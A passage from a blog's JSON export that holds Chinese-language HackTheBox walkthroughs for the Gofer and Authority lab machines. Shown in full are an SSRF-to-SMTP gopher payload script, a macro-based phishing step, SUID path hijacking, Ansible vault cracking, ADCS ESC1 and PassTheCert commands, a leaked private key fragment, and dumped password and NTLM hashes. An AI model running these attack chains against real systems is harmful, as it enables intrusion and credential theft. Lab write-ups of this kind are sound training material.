ilkIVp3wAAAAMBAAEAAAGACFceKb88E5FxVbdsToiKMgS035fIl7HOgG3Neu4QzCAcDHyOGtmSPkz3k0vYOuwbC1Zvfl2LSIZ&#x2F;0iHOtpx5wKaq76kUMI9SpmY+lNe65DMIkQQ9W+&#x2F;k8chcxVMyxbG+HgkH+rGxYcTdmuXd8tp&#x2F;2glP6fk5buYKTASMkd2hhxyeAC03aCyM477lkbwar0U8EHynJ61m&#x2F;3fmUxlZMwxRVUroyE0oVOQ+J9+f16NAubtzwDSvDz0i9vIze8EzAj8o4miannzTSfIAqnWkGvTDudU+K45ElL6L0IFlci+2kwYvn1FirpwnGLI&#x2F;ZGBQ3JycUKS6ANFTwaaqskM3PeB1OlXjltJvinLDVgwRZVIIImcRTQXRtcI67WSU8SdrVLmjis3UBMsgWSXiFd9tEt4Nr0N7&#x2F;f+wwqSAhRZnaDRnZ5&#x2F;5lJYlNS3o1givjWujKXH2JMLskQCJC1K2RzNJ6hG5VLywXAFeFieU1S5HDcJLntC6I3qWkXvQm4Qk3twb8OtJAAAAwFP19lYB0YjaIiSBpge2o3ZndOiaIq&#x2F;+ZasMwozd&#x2F;MmtFFVag14yU3JdP+m4ylhmtsHPKe1nz6z+AEQBhEdaswmGd+FPDfAMrqlqKcO033mNev94ol78+aoNLIQRMciXockvBKpbZVsmqgExIBUgekqfG5OEZgA6FGw1h1To8U0SdEXYgyGNIsTrNC2HYGbfv&#x2F;xj4S1If7vca&#x2F;Z+JJmN+9&#x2F;sGDEbStZdtL1KJQfFVSlJD7CBSzrx20ePYeYmxERiJwAAAMEA5rRy5cWJul&#x2F;sODrSLwXHZvOuuh2ZWfthRBx41G6m4psgu+1NlkTibITO4YgQUl&#x2F;8t5PPBACwwyLlxo+fyF&#x2F;GaZ9sx8JRnEyykJLhnUSkcpdJXf5+O1kXw5FNwEagjyzKjl46nbz+&#x2F;6SS2Vq7kgxRMDwrh0VON&#x2F;KzW3ycmnxTwC2M+PGeFqFN2pfwT&#x2F;WE5of27TQSDVZ7s+KYGzTELkj&#x2F;uHTJeQ28VCCvGDH9JiRVq9ekoFkVSYj+7Mnj9gibq+OtAAAAwQDOp2NTQGD5+Jh7NfIibMW7HxRvX9UYr&#x2F;XGhK3kQXgJbu+pG&#x2F;HC8ZOLljk+FumyXkoby4u6++yWKRzBNKqJttS6EkKNBokDA9is1sZfDbkx3obi&#x2F;3avJ8rRNIEMdOZERxQVzrwpl42BZv0DPVpI7CBTF4xDbcES4qiJeLjiR5TPVS4RmguqpPZqKHZBekerVA8hWeZJ+yPi6UMB1q9twB4HuTSROL+6qYMh6j4Cm8U+y8sr&#x2F;rZSAfIFVtgju4B91TsAAAANcm9vdEBkb3dubG9hZAECAwQFBg&#x3D;&#x3D;-----END OPENSSH PRIVATE KEY----- 参考资料 DigitalInterruption/cookie-monster: A utility for automating the testing and re-signing of Express.js cookie secrets.https://github.com/DigitalInterruption/cookie-monster Working with PrismaClient (Concepts)https://www.prisma.io/docs/concepts/components/prisma-client/working-with-prismaclient Filtering and Sorting (Concepts)https://www.prisma.io/docs/concepts/components/prisma-client/filtering-and-sorting su/sudo from root to another user allows TTY hijacking and arbitrary code executionhttps://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Gofer - HackTheBox","slug":"Gofer-HackTheBox","date":"2023-07-31T08:29:02.000Z","updated":"2023-10-30T01:43:43.207Z","comments":true,"path":"2023/07/31/Gofer-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/07/31/Gofer-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/Gofer 10.10.11.225 端口扫描22,80,开了smb的Linux，还有被过滤的25: 1234567891011121314151617181920212223242526272829$ nmap -sC -sV -Pn 10.10.11.225Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-31 13:37 CSTNmap scan report for 10.10.11.225Host is up (0.13s latency).Not shown: 995 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey:| 3072 aa:25:82:6e:b8:04:b6:a9:a9:5e:1a:91:f0:94:51:dd (RSA)| 256 18:21:ba:a7:dc:e4:4f:60:d7:81:03:9a:5d:c2:e5:96 (ECDSA)|_ 256 a4:2d:0d:45:13:2a:9e:7f:86:7a:f6:f7:78:bc:42:d9 (ED25519)25/tcp filtered smtp80/tcp open http Apache httpd 2.4.56|_http-server-header: Apache/2.4.56 (Debian)|_http-title: Did not follow redirect to http://gofer.htb/139/tcp open netbios-ssn Samba smbd 4.6.2445/tcp open netbios-ssn Samba smbd 4.6.2Service Info: Host: gofer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb2-security-mode:| 3:1:1:|_ Message signing enabled but not required| smb2-time:| date: 2023-07-31T05:39:01|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 98.02 seconds 80需要加hosts： 110.10.11.225 gofer.htb SMBsmb匿名访问，backup里得到一个mail: 1python3 ~/Tools/impacket/examples/smbclient.py miao@10.10.11.225 -no-pass 查看邮件内容，提到Jocelyn容易被邮件钓鱼,libreoffice odt格式，并且提到网络代理现在正在做限制访问 mail1234567891011121314151617From jdavis@gofer.htb Fri Oct 28 20:29:30 2022Return-Path: &lt;jdavis@gofer.htb&gt;X-Original-To: tbuckley@gofer.htbDelivered-To: tbuckley@gofer.htbReceived: from gofer.htb (localhost [127.0.0.1]) by gofer.htb (Postfix) with SMTP id C8F7461827 for &lt;tbuckley@gofer.htb&gt;; Fri, 28 Oct 2022 20:28:43 +0100 (BST)Subject:Important to read!Message-Id: &lt;20221028192857.C8F7461827@gofer.htb&gt;Date: Fri, 28 Oct 2022 20:28:43 +0100 (BST)From: jdavis@gofer.htbHello guys,Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That&#39;s why from now on, I&#39;ve decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice.PS: Last thing for Tom; I know you&#39;re working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via &lt;Limit&gt; 子域名扫描子域名扫描可以发现proxy，应该就是邮件里提到的代理： 1234ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u \"http://gofer.htb/\" -H 'Host: FUZZ.gofer.htb' -fw 20[Status: 401, Size: 462, Words: 42, Lines: 15, Duration: 165ms] * FUZZ: proxy proxy添加hosts，直接访问是401，但根据前面邮件内容，限制访问是正在做，那就是还没完成，直接POST请求可以得到缺少url参数信息(小细节,post根目录还是401，/index.php才能得到信息): url ssrf添加url测试，确认存在SSRF: filterurl参数还存在一些过滤,例如file协议和127，file协议可以简单的绕过： SSRF Cheat Sheet &amp; Bypass Techniqueshttps://highon.coffee/blog/ssrf-cheat-sheet/ SSRF (Server Side Request Forgery) - HackTrickshttps://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery 127 ip过滤也可以通过简单的进制转换绕过： SSRF SMTP根据已有信息，重点是前面邮件里提到的钓鱼和内部邮件，SMTP外部被过滤但可以内部访问，那就可以通过SSRF来通过gopher协议和SMTP交互发邮件： Server-Side Request Forgery to Internal SMTP Access | by Muh. Fani Akbar | InfoSec Write-upshttps://infosecwriteups.com/server-side-request-forgery-to-internal-smtp-access-dea16fe37ed2 tarunkant/Gopherus: This tool generates gopher link for exploiting SSRF and gaining RCE in various servershttps://github.com/tarunkant/Gopherus Web-Application-Attack/other-vulnerability/service-side-request-forgery/ssrf-and-smtp.md at master · rhamaa/Web-Application-Attackhttps://github.com/rhamaa/Web-Application-Attack/blob/master/other-vulnerability/service-side-request-forgery/ssrf-and-smtp.md 钓鱼目标用户根据前面邮件知道是Jocelyn，然后根据主站team页面中的全名和邮件中邮箱格式知道Jocelyn的邮件地址是Jhudson@gofer.htb ssrf.php123456789101112131415&lt;?php $commands = array( 'HELO gofer.htb', 'MAIL FROM: &lt;miao@miao.com&gt;', 'RCPT TO: &lt;Jhudson@gofer.htb&gt;', 'DATA', 'Subject: SSRF HERE', 'http://10.10.14.6:7777/test_miao', '.' ); $payload = implode('%0A', $commands); // memisahkan tiap command dengan newline echo urlencode('gopher://0x7f000001:25/_' . $payload);?&gt; libreoffice to shell现在可以成功钓鱼让目标用户点击我们发送的链接，下一步就是具体利用了，根据前面信息知道用的libreoffice，需要odt格式： msf自带的几个libreoffice模块测试都不行 ,只能自己手动来，libreoffice可以直接使用shell： Using Malicious LibreOffice Calc Macros to Target Linuxhttps://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html 参考上面的文章手动编辑分配宏，区别就是文章用的表格，odt需要是文档。制作完之后同样的发送钓鱼，得到jhudson： user flagjhudson用户目录得到user.txt: 信息查看home目录发现后还有其他几个用户,运行pspy发现定时运行的curl，其中得到tbuckley账号密码： 12023/07/31 08:25:01 CMD: UID=0 PID=34951 | /usr/bin/curl http://proxy.gofer.htb/?url=http://gofer.htb --user tbuckley:ooP4dietie3o_hquaeti tbuckley可以ssh登录,继续枚举，发现/usr/local/bin/notes有suid，dev组可以执行，而当前用户tbuckley在dev组： notes直接运行是一堆选项： 下载到本地分析： 1scp tbuckley@10.10.11.225:/usr/local/bin/notes . 本地ghidra之类报错的话可以用这个在线的： Decompiler Explorerhttps://dogbolt.org/ user选项1 创建用户会通过malloc分配40个字节，前24是用户名，后16是角色,如果运行这个程序的是root，角色是admin，否则是user： 123456$ echo -e \"\\x69\\x6d\\x64\\x61\"imda$ echo -e \"\\x6e\"n$ echo -e \"\\x72\\x65\\x73\\x75\"resu 选项2 就是show user info： 选项3 删除用户，只是free，没有清空(重点): notes选项4 创建笔记也是通过malloc申请40字节内存，和前面user申请的大小一样(也是重点)，选项5就是显示创建的笔记，选项6还没实现，选项7是删除： backup选项8是backup，首先判断用户是否是admin，通过后使用tar进行备份，注意tar没有指定绝对路径： 提权 &amp; root flag分两部分，第一部分是利用UAF成为admin，第二部分是backup劫持tar UAF所以二进制利用就是类似UAF的方式,因为user和note的size相同,user被释放后note再申请相同size的内存，得到的是同一地址，整个流程大概这样: 首先创建一个用户。 这将使用 malloc 在内存中分配 40 个字节，并将用户名放在前 24 个字节，角色放在最后 16 个字节。 删除用户 （漏洞就在这里） 它释放分配的内存，但没有将指针（指向为用户分配的内存）设置为空。因此，即使它被释放，它仍然指向分配的内存。 写个笔记。 这再次调用malloc分配40字节。和前面的malloc一样，会分配相同的区域。我们的用户在那里。 使用这个，我们可以写入我们的第一个指针仍然指向的内存，并使用如下注释修改用户角色(24个A)：AAAAAAAAAAAAAAAAAAAAAAAAadmin 现在可以调用 show user info 来确认这一点， backup然后可以使用backup来运行tar，因为tar没有使用绝对路径，基础的路径劫持: Hijacking Relative Paths in SUID Programs | by Nairuz Abulhul | R3d Buck3T | Mediumhttps://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e 1export PATH&#x3D;&#x2F;tmp&#x2F;miao:$PATH root flag我们的命令被成功执行： shadow12345root:$y$j9T$nDuW.3vSoMpbgISVomFz40$s8PL3BYhQ5HJINwYWlXvYKi9NnEt5KpMXlf3O0jHSx4:19473:0:99999:7:::jhudson:$y$j9T$O6XZVpGdd39Y3B0Qp9CY61$.yB.uWO1PxZdDWfWB6iMqeGv63HMQXM.uQIfVo0TfQ7:19299:0:99999:7:::jdavis:$y$j9T$MWpAazKnpmOMo4DbZ9J40.$&#x2F;lsXfhbM1t&#x2F;kBxFQ7x1EVyJqKBSnnVfyUMtqjk8hYH3:19299:0:99999:7:::tbuckley:$y$j9T$lgIfer5W5WyVWLfwzpDlu0$xpToiOURzOsTVzfgX6sgl1dNzqq7334cGlzKNm.h7T9:19299:0:99999:7:::ablake:$y$j9T$bLmJdnLApO3jfWtDGHpi60$1lLmLhhfVRQeXUDOssZ2YP46pXPg0rWWrUCaE7LlDTA:19299:0:99999:7::: 参考资料 SSRF Cheat Sheet &amp; Bypass Techniqueshttps://highon.coffee/blog/ssrf-cheat-sheet/ SSRF (Server Side Request Forgery) - HackTrickshttps://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery Server-Side Request Forgery to Internal SMTP Access | by Muh. Fani Akbar | InfoSec Write-upshttps://infosecwriteups.com/server-side-request-forgery-to-internal-smtp-access-dea16fe37ed2 tarunkant/Gopherus: This tool generates gopher link for exploiting SSRF and gaining RCE in various servershttps://github.com/tarunkant/Gopherus Web-Application-Attack/other-vulnerability/service-side-request-forgery/ssrf-and-smtp.md at master · rhamaa/Web-Application-Attackhttps://github.com/rhamaa/Web-Application-Attack/blob/master/other-vulnerability/service-side-request-forgery/ssrf-and-smtp.md Using Malicious LibreOffice Calc Macros to Target Linuxhttps://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html Decompiler Explorerhttps://dogbolt.org/ Hijacking Relative Paths in SUID Programs | by Nairuz Abulhul | R3d Buck3T | Mediumhttps://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"RegistryTwo - HackTheBox","slug":"RegistryTwo-HackTheBox","date":"2023-07-28T01:36:48.000Z","updated":"2023-07-28T01:45:19.194Z","comments":true,"path":"2023/07/28/RegistryTwo-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/07/28/RegistryTwo-HackTheBox/","excerpt":"有东西被加密了, 请输入密码查看.","text":"您好, 这里需要密码. root hash: $6$13hvGW.I$Y******pbC1b261T9/ ","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Authority - HackTheBox","slug":"Authority-HackTheBox","date":"2023-07-17T07:50:21.000Z","updated":"2023-12-11T03:10:23.115Z","comments":true,"path":"2023/07/17/Authority-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/07/17/Authority-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/Authority 10.10.11.222 端口扫描80,445,8443,以及一些常见域端口： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116$ nmap -sC -sV -Pn 10.10.11.222Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-17 13:40 CSTNmap scan report for 10.10.11.222Host is up (0.12s latency).Not shown: 987 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0|_http-title: IIS Windows Server| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.088/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-07-17 09:41:16Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)| ssl-cert: Subject:| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB| Not valid before: 2022-08-09T23:03:21|_Not valid after: 2024-08-09T23:13:21|_ssl-date: 2023-07-17T09:42:08+00:00; +4h00m00s from scanner time.445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)| ssl-cert: Subject:| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB| Not valid before: 2022-08-09T23:03:21|_Not valid after: 2024-08-09T23:13:21|_ssl-date: 2023-07-17T09:42:06+00:00; +4h00m00s from scanner time.3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)|_ssl-date: 2023-07-17T09:42:08+00:00; +4h00m00s from scanner time.| ssl-cert: Subject:| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB| Not valid before: 2022-08-09T23:03:21|_Not valid after: 2024-08-09T23:13:213269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)|_ssl-date: 2023-07-17T09:42:06+00:00; +4h00m00s from scanner time.| ssl-cert: Subject:| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB| Not valid before: 2022-08-09T23:03:21|_Not valid after: 2024-08-09T23:13:218443/tcp open ssl/https-alt|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).|_ssl-date: TLS randomness does not represent time| fingerprint-strings:| FourOhFourRequest, GetRequest:| HTTP/1.1 200| Content-Type: text/html;charset=ISO-8859-1| Content-Length: 82| Date: Mon, 17 Jul 2023 09:41:22 GMT| Connection: close| &lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"refresh\" content=\"0;URL='/pwm'\"/&gt;&lt;/head&gt;&lt;/html&gt;| HTTPOptions:| HTTP/1.1 200| Allow: GET, HEAD, POST, OPTIONS| Content-Length: 0| Date: Mon, 17 Jul 2023 09:41:22 GMT| Connection: close| RTSPRequest:| HTTP/1.1 400| Content-Type: text/html;charset=utf-8| Content-Language: en| Content-Length: 1936| Date: Mon, 17 Jul 2023 09:41:28 GMT| Connection: close| &lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400| Request&lt;/title&gt;&lt;style type=\"text/css\"&gt;body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;font-size:16px;&#125; h3 &#123;font-size:14px;&#125; p &#123;font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400|_ Request&lt;/h1&gt;&lt;hr class=\"line\" /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; Invalid character found in the HTTP protocol [RTSP&amp;#47;1.00x0d0x0a0x0d0x0a...]&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid| ssl-cert: Subject: commonName=172.16.2.118| Not valid before: 2023-07-15T06:48:09|_Not valid after: 2025-07-16T18:26:331 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=7/17%Time=64B4D482%P=x86_64-apple-darwiSF:n22.4.0%r(GetRequest,DB,\"HTTP/1\\.1\\x20200\\x20\\r\\nContent-Type:\\x20text/SF:html;charset=ISO-8859-1\\r\\nContent-Length:\\x2082\\r\\nDate:\\x20Mon,\\x2017SF:\\x20Jul\\x202023\\x2009:41:22\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\\n\\n\\SF:n\\n\\n&lt;html&gt;&lt;head&gt;&lt;meta\\x20http-equiv=\\\"refresh\\\"\\x20content=\\\"0;URL='/pSF:wm'\\\"/&gt;&lt;/head&gt;&lt;/html&gt;\")%r(HTTPOptions,7D,\"HTTP/1\\.1\\x20200\\x20\\r\\nAllowSF::\\x20GET,\\x20HEAD,\\x20POST,\\x20OPTIONS\\r\\nContent-Length:\\x200\\r\\nDate:SF:\\x20Mon,\\x2017\\x20Jul\\x202023\\x2009:41:22\\x20GMT\\r\\nConnection:\\x20closSF:e\\r\\n\\r\\n\")%r(FourOhFourRequest,DB,\"HTTP/1\\.1\\x20200\\x20\\r\\nContent-TypSF:e:\\x20text/html;charset=ISO-8859-1\\r\\nContent-Length:\\x2082\\r\\nDate:\\x2SF:0Mon,\\x2017\\x20Jul\\x202023\\x2009:41:22\\x20GMT\\r\\nConnection:\\x20close\\rSF:\\n\\r\\n\\n\\n\\n\\n\\n&lt;html&gt;&lt;head&gt;&lt;meta\\x20http-equiv=\\\"refresh\\\"\\x20content=SF:\\\"0;URL='/pwm'\\\"/&gt;&lt;/head&gt;&lt;/html&gt;\")%r(RTSPRequest,82C,\"HTTP/1\\.1\\x20400\\SF:x20\\r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nContent-Language:\\x2SF:0en\\r\\nContent-Length:\\x201936\\r\\nDate:\\x20Mon,\\x2017\\x20Jul\\x202023\\x2SF:009:41:28\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;!doctype\\x20html&gt;&lt;htmlSF:\\x20lang=\\\"en\\\"&gt;&lt;head&gt;&lt;title&gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20BSF:ad\\x20Request&lt;/title&gt;&lt;style\\x20type=\\\"text/css\\\"&gt;body\\x20&#123;font-family:TSF:ahoma,Arial,sans-serif;&#125;\\x20h1,\\x20h2,\\x20h3,\\x20b\\x20&#123;color:white;backSF:ground-color:#525D76;&#125;\\x20h1\\x20&#123;font-size:22px;&#125;\\x20h2\\x20&#123;font-size:1SF:6px;&#125;\\x20h3\\x20&#123;font-size:14px;&#125;\\x20p\\x20&#123;font-size:12px;&#125;\\x20a\\x20&#123;colSF:or:black;&#125;\\x20\\.line\\x20&#123;height:1px;background-color:#525D76;border:nonSF:e;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20BaSF:d\\x20Request&lt;/h1&gt;&lt;hr\\x20class=\\\"line\\\"\\x20/&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt;\\x20ExceptionSF:\\x20Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt;\\x20Invalid\\x20character\\x20found\\x20in\\SF:x20the\\x20HTTP\\x20protocol\\x20\\[RTSP&amp;#47;1\\.00x0d0x0a0x0d0x0a\\.\\.\\.\\]&lt;/SF:p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt;\\x20The\\x20server\\x20cannot\\x20or\\x20will\\x20notSF:\\x20process\\x20the\\x20request\\x20due\\x20to\\x20something\\x20that\\x20is\\xSF:20perceived\\x20to\\x20be\\x20a\\x20client\\x20error\\x20\\(e\\.g\\.,\\x20malformSF:ed\\x20request\\x20syntax,\\x20invalid\\x20\");Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode:| 3:1:1:|_ Message signing enabled and required|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s| smb2-time:| date: 2023-07-17T09:41:58|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 107.39 seconds 80IIS默认页面： 8443自动跳转到pwm，当前是配置模式： SMBsmb匿名访问： 1python3 ~/Tools/impacket/examples/smbclient.py miao@10.10.11.222 -no-pass Development翻共享目录，最终在ansible下面的pwm里得到一个yml文件： 123456789# use Development# ls# cd Ansible# ls# cd PWM# ls# cd defaults# ls# get main.yml main.yml是一个ansible的加密vault： mail.yml content1234567891011121314151617181920212223242526272829303132333435---pwm_run_dir: \"&#123;&#123; lookup('env', 'PWD') &#125;&#125;\"pwm_hostname: authority.htb.corppwm_http_port: \"&#123;&#123; http_port &#125;&#125;\"pwm_https_port: \"&#123;&#123; https_port &#125;&#125;\"pwm_https_enable: truepwm_require_ssl: falsepwm_admin_login: !vault | $ANSIBLE_VAULT;1.1;AES256 32666534386435366537653136663731633138616264323230383566333966346662313161326239 6134353663663462373265633832356663356239383039640a346431373431666433343434366139 35653634376333666234613466396534343030656165396464323564373334616262613439343033 6334326263326364380a653034313733326639323433626130343834663538326439636232306531 3438pwm_admin_password: !vault | $ANSIBLE_VAULT;1.1;AES256 31356338343963323063373435363261323563393235633365356134616261666433393263373736 3335616263326464633832376261306131303337653964350a363663623132353136346631396662 38656432323830393339336231373637303535613636646561653637386634613862316638353530 3930356637306461350a316466663037303037653761323565343338653934646533663365363035 6531ldap_uri: ldap://127.0.0.1/ldap_base_dn: \"DC=authority,DC=htb\"ldap_admin_password: !vault | $ANSIBLE_VAULT;1.1;AES256 63303831303534303266356462373731393561313363313038376166336536666232626461653630 3437333035366235613437373733316635313530326639330a643034623530623439616136363563 34646237336164356438383034623462323531316333623135383134656263663266653938333334 3238343230333633350a646664396565633037333431626163306531336336326665316430613566 3764 Ansbile针对ansible vault加密，就是破解出vault的密码，再从vault中解出来存储的密码： ansible-vault — Ansible Documentationhttps://docs.ansible.com/ansible/latest/cli/ansible-vault.html Ansible - Pentester’s Promiscuous Notebookhttps://ppn.snovvcrash.rocks/pentest/infrastructure/devops/ansible John: run/ansible2john.py | Fossieshttps://fossies.org/linux/john/run/ansible2john.py 去掉多余的换行，破解出vault密码： 1234python3 /usr/share/john/ansible2john.py ./vault1.yml &gt; hash.txtsudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt!@#$%^&amp;* (vault1.yml) 然后从vault中解出密码,不想安装ansible的话可以直接用这个： ansible-vault · PyPIhttps://pypi.org/project/ansible-vault/ 123456pip install ansible-vaultpython3 decrypt.pysvc_pwmpWm_@dm!N_!23DevT3st@123 PWM得到的账号密码尝试去登录pwm，报错证书问题： Configuration Manager但可以登录进入Configuration Manager，可以下载配置和导入配置： 下载查看配置文件，根据前面的报错信息，LDAP链接有问题，定位到settings里的ldap url： Responder + ldap那么可以尝试修改其中的链接来获取连接信息，开启responder，修改URL为ldap： 123sudo python3 Responder.py -i 10.10.14.8 -vldap://10.10.14.8:389 导入配置,Responder中得到了ldap连接信息： 123[LDAP] Cleartext Client : 10.10.11.222[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb[LDAP] Cleartext Password : lDaP_1n_th3_cle4r! user flag得到的svc_ldap用户账号密码登录： 1evil-winrm -i 10.10.11.222 -u svc_ldap -p lDaP_1n_th3_cle4r! 提权信息前面SMB里有ADCS相关目录，C盘根目录也有Certs，里面是ldaps相关证书： 直接certipy也可以发现存在漏洞的模板，但需要是Domain Computers才能利用，所以首先需要添加一个机器账户： 1234certipy find -vulnerable -stdout -u svc_ldap -p lDaP_1n_th3_cle4r! -dc-ip 10.10.11.222 -scheme ldapTemplate Name : CorpVPNCertificate Authorities : AUTHORITY-CA ADCS ESC1svc_ldap可以添加机器账号，然后就是esc1一步步： AD CS Domain Escalation - HackTrickshttps://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#misconfigured-certificate-templates-esc1 123python3 ~/Tools/impacket/examples/addcomputer.py authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name miao$ -computer-pass Miao@123456 -dc-ip 10.10.11.222certipy req -u 'miao$' -p 'Miao@123456' -dc-ip 10.10.11.222 -ca AUTHORITY-CA -template 'CorpVPN' -upn 'Administrator' 但得到的证书并不能直接获取hash，因为KDC不支持kerberos认证，搜索信息，需要通过PassTheCert方式： Help understanding limitations of “KDC_ERR_PADATA_TYPE_NOSUPP” · Issue #64 · ly4k/Certipyhttps://github.com/ly4k/Certipy/issues/64 Authenticating with certificates when PKINIT is not supported - Almond Offensive Security Bloghttps://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html PassTheCert &amp; root flag使用提供的python版本PassTheCert: AlmondOffSec/PassTheCert: Proof-of-Concept tool to authenticate to an LDAP/S server with a certificate through Schannelhttps://github.com/AlmondOffSec/PassTheCert 1234certipy cert -pfx administrator.pfx -nokey -out user.crtcertipy cert -pfx administrator.pfx -nocert -out user.keypython3 passthecert.py -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222 -action whoami 然后就可以使用其他action，例如modify_user修改管理员密码，或者ldap-shell里进行操作添加管理员(调用的是impacket的ldap-shell)： 12345python3 passthecert.py -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222 -action modify_user -target administrator -new-pass Miao@123456python3 passthecert.py -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222 -action ldap-shelladd_user_to_group svc_ldap Administrators root flag hashdump用svc_ldap来，不修改原本的任何账号密码： 1234567python3 ~/Tools/impacket/examples/secretsdump.py svc_ldap:\"lDaP_1n_th3_cle4r\\!\"@10.10.11.222 -just-dc-ntlmAdministrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:5f2d84fb5e44ccaddb52c672b9578fcb::: 参考资料 ansible-vault — Ansible Documentationhttps://docs.ansible.com/ansible/latest/cli/ansible-vault.html Ansible - Pentester’s Promiscuous Notebookhttps://ppn.snovvcrash.rocks/pentest/infrastructure/devops/ansible John: run/ansible2john.py | Fossieshttps://fossies.org/linux/john/run/ansible2john.py ansible-vault · PyPIhttps://pypi.org/project/ansible-vault/ AD CS Domain Escalation - 